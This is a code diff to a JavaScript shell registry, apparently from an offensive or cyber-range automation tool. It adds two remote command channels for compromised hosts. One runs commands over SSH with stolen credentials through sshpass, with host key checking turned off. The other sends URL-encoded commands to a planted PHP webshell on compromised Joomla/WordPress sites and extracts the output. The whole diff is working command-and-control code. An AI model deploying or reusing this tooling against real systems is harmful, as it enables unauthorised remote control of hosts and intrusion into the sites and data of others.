@@ -20,6 +20,17 @@
 import { randomUUID } from 'node:crypto';
 import { execFile } from 'node:child_process';
 
+
+function parseFormBody(tpl) {
+  // "a=1&c={CMD}" → replace {CMD} already done; split into pairs
+  const out = {};
+  for (const kv of String(tpl).split('&')) {
+    const [k, v = ''] = kv.split('=');
+    out[decodeURIComponent(k)] = decodeURIComponent(v);
+  }
+  return out;
+}
+
 /** shells by id — process-lifetime registry (audit trail lives on the bus). */
 const shells = new Map();
 
@@ -84,7 +95,57 @@ export function createShellRegistry({ bus, wal, listScope } = {}) {
     const t0 = Date.now();
     let stdout = '', stderr = '', code = 0;
     try {
-      if (sh.transport === 'local') {
+      if (sh.transport === 'ssh') {
+        // transportRef: "user:pass@host:port" — VM range channel (post-creds).
+        const m = /^(.+?):(.*?)@([^:]+)(?::(\d+))?$/.exec(sh.transportRef || '');
+        if (!m) return { ok: false, error: 'ssh transportRef 需 user:pass@host[:port]' };
+        const [, u, pw, h, port] = m;
+        const r = await new Promise((resolve) => {
+          execFile('sshpass', ['-p', pw, 'ssh', '-o', 'StrictHostKeyChecking=no',
+            '-o', 'UserKnownHostsFile=/dev/null', '-p', port || '22',
+            `${u}@${h}`, 'bash -lc ' + JSON.stringify(command)],
+            { timeout: timeoutMs, maxBuffer: MAX_OUT }, (err, so, se) =>
+            resolve({ err, so: String(so ?? ''), se: String(se ?? ''), code: err ? (err.code ?? 1) : 0 }));
+        });
+        stdout = r.so; stderr = r.se; code = r.code;
+        if (r.err?.killed) stderr += '\n[timeout]';
+      } else if (sh.transport === 'web') {
+        // transportRef: full URL template with {CMD} placeholder, e.g.
+        //   http://h/p.php?c={CMD}        (GET; CMD urlencoded)
+        //   POST|http://h/p.php|c={CMD}   (POST body form-encoded)
+        // Optional response delimiters after '#' as marker: ...{CMD}#MARK
+        // — only text between <MARK> and </MARK> is returned (kills the
+        // Joomla/WordPress page-prefix noise that caused two misreads).
+        const spec = sh.transportRef || '';
+        const [spec0, marker] = spec.split('#');
+        const isPost = spec0.startsWith('POST|');
+        const tpl = isPost ? spec0.slice(5) : spec0;
+        if (!tpl.includes('{CMD}')) return { ok: false, error: 'web transportRef 需含 {CMD} 占位' };
+        const enc = encodeURIComponent(command);
+        const url = isPost ? tpl : tpl.replace('{CMD}', enc);
+        const body = isPost ? tpl.replace('{CMD}', enc) : null;
+        const ctl = new AbortController();
+        const t = setTimeout(() => ctl.abort(), Math.min(timeoutMs, 60_000)); // hard kill
+        try {
+          const r = await fetch(url, {
+            method: isPost ? 'POST' : 'GET',
+            body: isPost ? new URLSearchParams(parseFormBody(body)) : undefined,
+            headers: isPost ? { 'content-type': 'application/x-www-form-urlencoded' } : {},
+            signal: ctl.signal,
+          });
+          let txt = await r.text();
+          clearTimeout(t);
+          if (marker) {
+            const m1 = txt.indexOf('<' + marker + '>');
+            const m2 = txt.indexOf('</' + marker + '>');
+            if (m1 >= 0) txt = m2 > m1 ? txt.slice(m1 + marker.length + 2, m2) : txt.slice(m1 + marker.length + 2);
+          }
+          stdout = txt.slice(0, MAX_OUT); stderr = ''; code = r.ok ? 0 : 1;
+        } catch (e) {
+          clearTimeout(t);
+          return { ok: false, error: 'webshell 通道异常(已硬杀): ' + e.message };
+        }
+      } else if (sh.transport === 'local') {
         // transportRef binds the shell to ONE exec box — commands land in
         // the compromised box, never the runtime host. Format "container"
         // (default user) or "container:user" (low-priv web compromise).
